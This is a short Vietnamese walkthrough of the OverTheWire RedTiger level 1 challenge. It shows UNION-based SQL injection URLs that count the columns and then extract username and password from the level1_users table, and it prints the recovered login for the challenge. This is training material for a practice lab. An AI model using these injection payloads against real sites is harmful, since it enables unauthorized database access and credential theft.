**1.Bắt đầu bằng việc tìm số cột bị lỗi của trang bằng:
-------------------------------------------------------

`http://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1` rồi tăng lần lượt lên `1,2` `1,2,3` đến khi nào không báo lỗi là dừng. Ở đây chúng ta được số cột là 4

http://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,3,4

<img src="http://i.imgur.com/ojcgFH2.jpg">

Như ta thấy cột 3,4 bị lỗi

**2. Khai thác thông tin từ 2 cột bị lỗi:
-----------------------------------------

Khi sử dụng `information_schema.columns` thì nhận được thông báo "Something is disable" vì thế chỉ đoán mò dựa vào hint ở đề bài là:

```sh
Target: Get the login for the user Hornoxe 
Hint: You really need one? omg -_- 
Tablename: level1_users 
```
http://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,username,password FROM level1_users WHERE username=0x486f726e6f7865

0x486f726e6f7865 ứng với mã hex của Hornoxe

<img src="http://i.imgur.com/E7qWXmJ.jpg">

Hornoxe
thatwaseasy
